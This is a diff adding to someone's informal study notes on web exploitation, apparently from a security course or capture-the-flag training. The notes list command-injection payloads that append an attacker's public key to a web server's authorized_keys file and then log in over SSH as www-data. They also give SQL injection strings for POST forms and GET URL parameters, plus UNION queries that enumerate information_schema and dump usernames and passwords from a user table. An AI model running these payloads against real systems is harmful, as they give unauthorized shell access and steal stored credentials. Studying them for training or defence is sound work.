@@ -40,7 +40,40 @@
   - `; touch /var/www/.ssh/authorized_keys`
   - `; ls -la /var/www/.ssh` - **ALWAYS CHECK TO MAKE SURE THE THINGS YOU DID ACTUALLY HAPPENED**
   - `; echo "(id_rsa.pub conents)" >> /var/www/.ssh/authorized_keys`
+  - `ssh -i .ssh/id_rsa www-data@X.X.X.X`
+    - www-data being the user that you are when you're on the webpage
 - Good walkthrough for all this on **Web Exploitation Day 1** 
+- POST method = input field box 
+  - `test' or 1='1`
+  - `test' or 1='1;`
+  - `test' or 1='1; #`
+  - `test' or 1='1; --`
+   - Can also try `OR` instead of `or` cuz shit is finnickyfuct
+  - throw it in both fields
+  - see if it breaks?
+- GET method = url thing
+  - information may be different thatn POST method
+  - can keep interacting with the page to see how the url changes
+  - blahblahblah.php?Selection=**1**&submitblahblah
+    - see that 1 changes to 2 or 3 and stuff 
+      - .php?Selection=1 or 1=1
+        - %20 represents a space in a URL field
+      - .php?Selection=2 or 1=1
+        - and 3 and 4 and so on
+          - different syntaxes `=2 or 1= 1;` `=2 or 1=1; #` and stuff same shit as POST method
+  - GOLDEN STATEMENT
+    - on vulnerable page, 
+      - Selection=2 UNION select table_schema,table_name,column_name from information.schema.columns 
+      - columns = Table, This table exists within the information_schema database
+      - table_schema = Column, List out database names 
+      - Column_name = Column, List out the column names
+        - see that there's a column name thing called session, with column names (middle column) from user table (right)
+        - UNION select 1,2,3,4,5,6 #
+        - UNION select 1,2,3 #
+          - let's say 2 showed 4 showed and 6 showed
+          - UNION select 1,table_schema,3,table_name,5,column_name from information_schema.columns
+            - put the things we wanted in their respective fields and filled in the rest with placeholder numbers
+        - UNION select id,name,pass from session.user
 
 
 
